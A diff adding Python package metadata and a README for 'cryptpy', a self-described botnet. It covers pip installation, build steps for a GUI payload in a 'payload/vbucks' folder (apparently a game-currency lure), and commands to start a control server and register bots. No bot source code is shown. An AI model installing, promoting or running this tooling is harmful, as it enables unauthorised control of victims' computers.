@@ -1,0 +1,73 @@
+Metadata-Version: 2.1
+Name: cryptpy
+Version: 0.3.5
+Summary: Dynamically programmable Python/JS botnet (educational purposes only).
+Home-page: https://github.com/mitsukomegumi/CryptPy.js
+Author: Mitsuko Megumi, Matt Nappo
+Author-email: mitsukomegumii@gmail.com
+License: UNKNOWN
+Project-URL: Bug Reports, https://github.com/mitsukomegumi/CryptPy.js/issues
+Project-URL: Say Thanks!, https://saythanks.io/to/mitsukomegumi
+Project-URL: Source, https://github.com/mitsukomegumi/CryptPy.js/
+Keywords: botnet tools development python js javascript hacking hackerman imin
+Platform: UNKNOWN
+Classifier: Development Status :: 3 - Alpha
+Classifier: Intended Audience :: Developers
+Classifier: License :: OSI Approved :: GNU General Public License v3 (GPLv3)
+Classifier: Programming Language :: Python :: 3
+Classifier: Programming Language :: Python :: 3.4
+Classifier: Programming Language :: Python :: 3.5
+Classifier: Programming Language :: Python :: 3.6
+Description-Content-Type: text/markdown
+Requires-Dist: ipgetter
+Requires-Dist: py3-rest-shell
+Requires-Dist: simplejson
+
+![Logo](http://mattnappo.com/crypt.png)
+
+[![Build Status](https://travis-ci.com/mitsukomegumi/CryptPy.js.svg?branch=master)](https://travis-ci.com/mitsukomegumi/CryptPy.js)
+___
+
+Dynamically programmable Python botnet (educational purposes only).
+
+## Installation
+
+### Core Installation with PIP (botnet sources)
+
+```BASH
+pip install cryptpy
+```
+
+### Building the Node Source (GUI Implementation)
+
+Note: requires installation of cryptpy
+
+First, `cd payload/vbucks`.
+
+Build for MacOS:
+
+1. `npm i`
+
+2. `yarn dist`
+
+Build for Windows:
+
+1. `npm i`
+
+2. `npm run dist`
+
+## Usage
+
+Start a Server:
+
+```bash
+cryptpy --server --terminal
+```
+
+Start and Register a Bot:
+
+```bash
+cryptpy
+```
+
+
